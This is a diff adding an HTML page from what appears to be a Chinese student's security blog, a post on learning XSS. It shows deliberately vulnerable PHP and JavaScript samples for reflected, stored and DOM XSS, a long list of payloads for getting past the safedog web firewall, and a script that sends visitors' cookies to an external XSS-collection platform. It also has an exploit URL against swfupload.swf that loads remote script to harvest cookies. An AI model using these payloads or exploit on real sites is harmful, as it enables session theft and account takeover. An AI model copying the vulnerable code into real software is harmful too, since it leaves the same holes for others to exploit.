@@ -1,0 +1,680 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+
+    <meta charset="utf-8">
+    <meta name="generator" content="Hugo 0.60.1" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <link href="https://cdn.bootcss.com/highlight.js/9.12.0/styles/monokai.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/languages/django.min.js"></script>
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/languages/vim.min.js"></script>
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/languages/yaml.min.js"></script>
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/languages/gradle.min.js"></script>
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/languages/tex.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+    
+    <script language="javascript" type="text/javascript" src="https://cdn.staticfile.org/jquery/1.7.2/jquery.min.js"></script>
+    <script type="text/javascript">
+        var a_idx = 0;
+        jQuery(document).ready(function($) {
+        $("body").click(function(e) {
+        var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");
+        var $i = $("<span/>").text(a[a_idx]);
+        a_idx = (a_idx + 1) % a.length;
+        var x = e.pageX,
+        y = e.pageY;
+        $i.css({
+        "z-index": 999999999999999999999999999999999999999999999999999999999999999999999,
+        "top": y - 20,
+        "left": x,
+        "position": "absolute",
+        "font-weight": "bold",
+        "color": "#ff6651"
+        });
+        $("body").append($i);
+        $i.animate({
+        "top": y - 180,
+        "opacity": 0
+        },
+        1500,
+        function() {
+        $i.remove();
+        });
+        });
+        });
+        </script>
+        
+        
+
+        <script src="http://www.lmlblog.com/winter/templets/xq/js/snowy.js"></script>
+        <script src="http://www.lmlblog.com/blog/12/js/Snow.js"></script>
+        <style type="text/css">
+        .snow-container{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:100001;}
+        </style>
+        <div class="snow-container"></div>
+
+
+    <title>xss-学习姿势 | Xyz的博客</title>
+    <meta property="og:title" content="xss-学习姿势 - Xyz的博客">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content="2019-07-04T12:43:31&#43;08:00">
+        
+        
+    <meta property="article:modified_time" content="2019-07-04T12:43:31&#43;08:00">
+        
+    <meta name="Keywords" content="c语言,php,goxyz,XYZ,java,android,博客,项目管理,电路,硬件,stm32,80c51">
+    <meta name="description" content="xss-学习姿势">
+        <meta name="author" content="xyz">
+        
+    <meta property="og:url" content="https://yaoyaomeng.github.io/post/xss-%E5%AD%A6%E4%B9%A0%E5%A7%BF%E5%8A%BF/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href="/css/normalize.css">
+    
+        <link rel="stylesheet" href="/css/prism.css">
+    
+    <link rel="stylesheet" href="/css/style.css">
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+
+
+    
+    
+
+</head>
+
+<body>
+<header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://yaoyaomeng.github.io">
+                        Xyz的博客
+                    </a>
+                
+                <p class="description">一个大一嵌入式学生的博客</p>
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="current" href="https://yaoyaomeng.github.io">首页</a>
+                    
+                    <a  href="https://yaoyaomeng.github.io/tools/" title="工具">工具</a>
+                    
+                    <a  href="https://yaoyaomeng.github.io/archives/" title="归档">归档</a>
+                    
+                    <a  href="https://yaoyaomeng.github.io/about/" title="关于">关于</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+<div id="body">
+        
+        
+    <div class="container">
+        <div class="col-group">
+
+            <div class="col-8" id="main">
+                <div class="res-cons">
+                    <article class="post">
+                        <header>
+                            <h1 class="post-title">xss-学习姿势</h1>
+                        </header>
+                        <date class="post-meta meta-date">
+                            2019年7月4日
+                        </date>
+                        
+                        <div class="post-meta">
+                            <span>|</span>
+                            
+                                <span class="meta-category"><a href="https://yaoyaomeng.github.io/categories/websafe">websafe</a></span>
+                            
+                        </div>
+                        
+                        
+                        <div class="post-meta">
+                            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span> 阅读</span></span>
+                        </div>
+                        
+                        
+                        <div class="post-content">
+                            <p>xss也叫跨站脚本攻击，原因在于网站的前端因为对输入或者输出不严谨从而可以在网站插入脚本代码造成xss攻击。</p>
+<!-- raw HTML omitted -->
+<p>&lt;The rest of contents | 余下全文&gt;</p>
+<h2 id="xss">xss形成分类</h2>
+<p>主要是分为反射型和存储型还有dom型</p>
+<ol>
+<li>反射型
+这里的提交参数没有进行过滤转义，导致输出处可直接执行脚本代码</li>
+</ol>
+<pre><code>&lt;form action = &quot;htmlzr.&quot; method = &quot;get&quot;&gt;
+name:&lt;input type = &quot;text&quot; name = &quot;htmlname&quot;&gt;
+&lt;input type = &quot;submit&quot; value = &quot;提交&quot;&gt;
+&lt;/form&gt;
+&lt;?
+if(@$_GET['htmlname']){
+	echo $_GET['htmlname'];
+}
+?&gt;
+</code></pre><ol start="2">
+<li>存储型
+这里的提交参数是存储在数据库里面的，也没有进行过滤或转义，导致数据库查询返回输出提交参数时可执行脚本代码</li>
+</ol>
+<pre><code>&lt;?
+//这是插入的
+$conn = mysqli_connect('localhost','root','root','test');
+if (mysqli_connect_errno($conn)){
+	echo &quot;连接 MySQL 失败: &quot; . mysqli_connect_error(); 
+}
+if(@$_POST['name1']){
+	$name = $_POST['name1'];
+	$sql = &quot;INSERT INTO user (name) VALUES ('{$name}')&quot;;
+	if (mysqli_query($conn, $sql)) {
+    echo &quot;添加成功&quot;;
+	} else {
+    echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . mysqli_error($conn);
+}
+}
+?&gt;
+
+&lt;?
+//这是输出的
+$conn = mysqli_connect('localhost','root','root','test');
+if(! $conn )
+{
+    die('连接失败: ' . mysqli_error($conn));
+}
+mysqli_query($conn , &quot;set names utf8&quot;);
+$sql = 'select * from user where uid=3;';
+
+if (mysqli_query($conn, $sql)) {
+	$row = mysqli_fetch_array(mysqli_query($conn, $sql),MYSQLI_ASSOC);
+	echo $row['name'];
+	} else {
+    echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . mysqli_error($conn);
+}
+?&gt;
+
+</code></pre><ol start="3">
+<li>dom型
+我还是喜欢把他归类为反射型xss，这里的document.write的可执行脚本代码，//write() 方法可向文档写入 HTML 表达式或 JavaScript 代码。</li>
+</ol>
+<pre><code>&lt;script&gt;
+var a  = document.URL;
+document.write(decodeURI(a.substring(document.URL.ndexOf(&quot;content=&quot;) + 4)));
+&lt;/script&gt;
+</code></pre><h2 id="xss-bypass-safedog">xss bypass safedog</h2>
+<p>过狗方法总结</p>
+<p><!-- raw HTML omitted -->XSS过滤绕过速查表<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->利用JavaScript全局变量绕过XSS过滤器 <!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->无需括号和分号的XSS<!-- raw HTML omitted --></p>
+<p>部分过狗payloads(来自<!-- raw HTML omitted -->ChaBug<!-- raw HTML omitted -->)</p>
+<pre><code>&lt;a onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;javascript onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;b onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;abbr onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;acronym onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;address onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;applet onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;article onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;xss onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;aside onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;bdi onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;bdo onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;big onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;button onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;del onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;details onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;div onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;dfn onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;dl onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;dt onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;h1 onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;h2 onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;h3 onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;h4 onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;h5 onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;h6 onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;header onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;hr onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;html onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;kbd onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;map onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;mark onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;menu onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;menuitem onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;meter onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;q onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;var onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;xmp onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;addons onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;ascii onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;aspx onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;java onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;mobile onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;go onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;alibaba onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;baidu onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;google onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;github onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;acu onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;mail onclick=&quot;javascript:alert(0)&quot;&gt;a
+&lt;a onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;javascript onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;b onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;abbr onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;acronym onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;address onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;applet onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;article onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;xss onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;aside onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;bdi onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;bdo onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;big onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;button onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;del onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;details onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;div onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;dfn onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;dl onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;dt onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;h1 onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;h2 onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;h3 onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;h4 onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;h5 onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;h6 onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;header onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;hr onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;html onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;kbd onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;map onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;mark onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;menu onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;menuitem onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;meter onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;q onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;var onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;xmp onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;addons onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;ascii onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;aspx onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;java onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;mobile onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;go onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;alibaba onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;baidu onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;google onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;github onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;acu onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+&lt;mail onmouseover=&quot;javascript:alert(0)&quot;&gt;a
+</code></pre><h2 id="xss1">xss利用</h2>
+<p>xss的主要是盗取用户的cookie，修改网页的内容或者重定向到其他危险的网站，脚本代码一般也不用自己来编写一般有xss平台提供代码直接拿来用就ok</p>
+<ol>
+<li>盗取cookie（xss平台的）
+一般cookie都是有时间的，过了时间就没用这个问题只需要在xss平台把keepsession勾上就OK了</li>
+</ol>
+<pre><code>function(){(new Image()).src='https://xsspt.com/index.?do=api&amp;id=4IobBm&amp;location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&amp;toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&amp;cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&amp;opener='+escape((function(){try{return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
+if(''==1){keep=new Image();keep.src='https://xsspt.com/index.?do=keepsession&amp;id=4IobBm&amp;url='+escape(document.location)+'&amp;cookie='+escape(document.cookie)};
+</code></pre><p>现在是例子</p>
+<pre><code>www.xxxxx.com/statics/js/swfupload/swfupload.swf?movieName=&quot;])}catch(e){if(!window.x){window.x=1;document.body.appendChild(document.createElement('script')).src='https://xsshs.cn/1Uzk'}}//
+</code></pre><p>现在我们分析一下这段代码
+向swfupload.swf的movieName传值，这里在catch嵌套了一个if如果window.x为假则执行下面这段代码document.createElement(‘script’)).src=’https://xsshs.cn/1Uzk
+document.createElement在dom中创建元素节点script并代入script的src访问执行xss的网站
+当有用户点击时，则会被记录cookie
+<img src="http://ww1.sinaimg.cn/large/006iJVk5ly1g3tipbizx3j30wl0k70z0.jpg" alt="blockchain" title="2333"></p>
+
+                        </div>
+
+                        
+<div class="post-archive">
+    <ul class="post-copyright">
+        <li><strong>原文作者：</strong><a rel="author" href="https://yaoyaomeng.github.io">xyz</a></li>
+        <li style="word-break:break-all"><strong>原文链接：</strong><a href="https://yaoyaomeng.github.io/post/xss-%E5%AD%A6%E4%B9%A0%E5%A7%BF%E5%8A%BF/">https://yaoyaomeng.github.io/post/xss-%E5%AD%A6%E4%B9%A0%E5%A7%BF%E5%8A%BF/</a></li>
+        <li><strong>版权声明：</strong>本作品采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">知识共享署名-非商业性使用-禁止演绎 4.0 国际许可协议</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。</li>
+    </ul>
+</div>
+<br/>
+
+
+
+                        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/archives/">归档</a></li>
+        
+        <li><a href="/search/">搜索</a></li>
+        
+    </ul>
+</div>
+
+
+                        <div class="post-meta meta-tags">
+                            
+                            <ul class="clearfix">
+                                
+                                <li><a href="https://yaoyaomeng.github.io/tags/xss">xss</a></li>
+                                
+                            </ul>
+                            
+                        </div>
+                    </article>
+                    
+    
+
+    
+    
+    <div class="post bg-white">
+      <script src="https://utteranc.es/client.js"
+            repo= "yaoyaomeng/hugo-blogs-utterances"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+      </script>
+    </div>
+    
+                </div>
+            </div>
+            <div id="secondary">
+    <section class="widget">
+        <form id="search" action="/search/" method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://yaoyaomeng.github.io">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://yaoyaomeng.github.io/post/Fragment/" title="Fragment">Fragment</a>
+    </li>
+    
+    <li>
+        <a href="https://yaoyaomeng.github.io/post/android%E5%AD%A6%E4%B9%A02/" title="Android学习2">Android学习2</a>
+    </li>
+    
+    <li>
+        <a href="https://yaoyaomeng.github.io/post/android%E5%AD%A6%E4%B9%A01/" title="Android学习1">Android学习1</a>
+    </li>
+    
+    <li>
+        <a href="https://yaoyaomeng.github.io/post/STC51%E5%AD%A6%E4%B9%A0%E5%BD%92%E7%BA%B3/" title="STC51学习归纳">STC51学习归纳</a>
+    </li>
+    
+    <li>
+        <a href="https://yaoyaomeng.github.io/post/c%E8%AF%AD%E8%A8%80%E6%8C%87%E9%92%88/" title="C语言指针">C语言指针</a>
+    </li>
+    
+    <li>
+        <a href="https://yaoyaomeng.github.io/post/helloWorld/" title="Hello World">Hello World</a>
+    </li>
+    
+    <li>
+        <a href="https://yaoyaomeng.github.io/post/sqlinject/" title="Sqlinject">Sqlinject</a>
+    </li>
+    
+    <li>
+        <a href="https://yaoyaomeng.github.io/post/bypass-wts-waf/" title="Bypass Wts Waf">Bypass Wts Waf</a>
+    </li>
+    
+    <li>
+        <a href="https://yaoyaomeng.github.io/post/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%BA%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="代码执行于命令执行">代码执行于命令执行</a>
+    </li>
+    
+    <li>
+        <a href="https://yaoyaomeng.github.io/post/xss-%E5%AD%A6%E4%B9%A0%E5%A7%BF%E5%8A%BF/" title="xss-学习姿势">xss-学习姿势</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">分类</h3>
+<ul class="widget-list">
+    
+    <li><a href="https://yaoyaomeng.github.io/categories/C%E8%AF%AD%E8%A8%80/">C语言 (1)</a></li>
+    
+    <li><a href="https://yaoyaomeng.github.io/categories/android/">android (3)</a></li>
+    
+    <li><a href="https://yaoyaomeng.github.io/categories/websafe/">websafe (4)</a></li>
+    
+    <li><a href="https://yaoyaomeng.github.io/categories/%E5%8D%95%E7%89%87%E6%9C%BA/">单片机 (1)</a></li>
+    
+    <li><a href="https://yaoyaomeng.github.io/categories/%E6%9D%82%E6%8A%80%E6%B5%85%E5%B0%9D/">杂技浅尝 (1)</a></li>
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title">标签</h3>
+<div class="tagcloud">
+    
+    <a href="https://yaoyaomeng.github.io/tags/android/">android</a>
+    
+    <a href="https://yaoyaomeng.github.io/tags/bypass/">bypass</a>
+    
+    <a href="https://yaoyaomeng.github.io/tags/c/">c</a>
+    
+    <a href="https://yaoyaomeng.github.io/tags/c51/">c51</a>
+    
+    <a href="https://yaoyaomeng.github.io/tags/sql/">sql</a>
+    
+    <a href="https://yaoyaomeng.github.io/tags/xss/">xss</a>
+    
+    <a href="https://yaoyaomeng.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">代码执行</a>
+    
+    <a href="https://yaoyaomeng.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
+    
+    <a href="https://yaoyaomeng.github.io/tags/%E5%AE%89%E5%8D%93/">安卓</a>
+    
+    <a href="https://yaoyaomeng.github.io/tags/%E6%8C%87%E9%92%88/">指针</a>
+    
+    <a href="https://yaoyaomeng.github.io/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/">杂七杂八</a>
+    
+</div>
+    </section>
+
+    
+<section class="widget">
+    <h3 class="widget-title">友情链接</h3>
+    <ul class="widget-list">
+        
+        <li>
+            <a target="_blank" href="http://yuedu.baidu.com/ebook/14a722970740be1e640e9a3e" title="Android Gradle权威指南">Android Gradle权威指南</a>
+        </li>
+        
+        <li>
+            <a target="_blank" href="http://mirrors.flysnow.org/" title="常用开发工具CDN镜像">常用开发工具CDN镜像</a>
+        </li>
+        
+    </ul>
+</section>
+
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://yaoyaomeng.github.io/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+        </div>
+    </div>
+</div>
+<footer id="footer">
+    <div class="container">
+        &copy; 2020 <a href="https://yaoyaomeng.github.io">Xyz的博客 By xyz</a>.
+        Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io" target="_blank">Hugo</a>.
+        <a href="https://www.flysnow.org/" target="_blank">Theme</a> based on <a href="https://github.com/rujews/maupassant-hugo" target="_blank">maupassant</a>.
+        
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        
+        (function () {
+            $("pre code").parent().addClass("line-numbers")
+        }());
+
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script type="text/javascript" src="/js/prism.js" async="true"></script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src="/js/totop.js?v=0.0.0" async=""></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'GA ID', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+
+
+<script src="https://eqcn.ajz.miesnfu.com/wp-content/plugins/wp-3d-pony/live2dw/lib/L2Dwidget.min.js"></script>
+<script>
+L2Dwidget.init({
+    "model": {
+　　　　　　　
+        jsonPath: "https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json",
+        "scale": 1
+    },
+    "display": {
+        "position": "right", 
+        "width": 150,  
+        "height": 300, 
+        "hOffset": 0,
+        "vOffset": -20
+    },
+    "mobile": {
+        "show": true,
+        "scale": 0.5
+    },
+    "react": {
+        "opacityDefault": 0.7,
+        "opacityOnHover": 0.2
+    }
+});
+</script>
+<script type="text/javascript">
+(function(){
+	if (typeof self === 'undefined' || !self.Prism || !self.document) {
+		return;
+	}
+
+	if (!Prism.plugins.toolbar) {
+		console.warn('Copy to Clipboard plugin loaded before Toolbar plugin.');
+
+		return;
+	}
+
+	var ClipboardJS = window.ClipboardJS || undefined;
+
+	if (!ClipboardJS && typeof require === 'function') {
+		ClipboardJS = require('clipboard');
+	}
+
+	var callbacks = [];
+
+	if (!ClipboardJS) {
+		var script = document.createElement('script');
+		var head = document.querySelector('head');
+
+		script.onload = function() {
+			ClipboardJS = window.ClipboardJS;
+
+			if (ClipboardJS) {
+				while (callbacks.length) {
+					callbacks.pop()();
+				}
+			}
+		};
+
+		script.src = 'https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js';
+		head.appendChild(script);
+	}
+
+	Prism.plugins.toolbar.registerButton('copy-to-clipboard', function (env) {
+		var linkCopy = document.createElement('button');
+		linkCopy.textContent = '复制代码';
+
+		if (!ClipboardJS) {
+			callbacks.push(registerClipboard);
+		} else {
+			registerClipboard();
+		}
+
+		return linkCopy;
+
+		function registerClipboard() {
+			var clip = new ClipboardJS(linkCopy, {
+				'text': function () {
+					return env.code;
+				}
+			});
+
+			clip.on('success', function() {
+				linkCopy.textContent = '复制成功!';
+
+				resetText();
+			});
+			clip.on('error', function () {
+				linkCopy.textContent = '按 Ctrl+C 复制';
+
+				resetText();
+			});
+		}
+
+		function resetText() {
+			setTimeout(function () {
+				linkCopy.textContent = '复制代码';
+			}, 5000);
+		}
+	});
+})();
+
+</script>
+</body>
+</html>
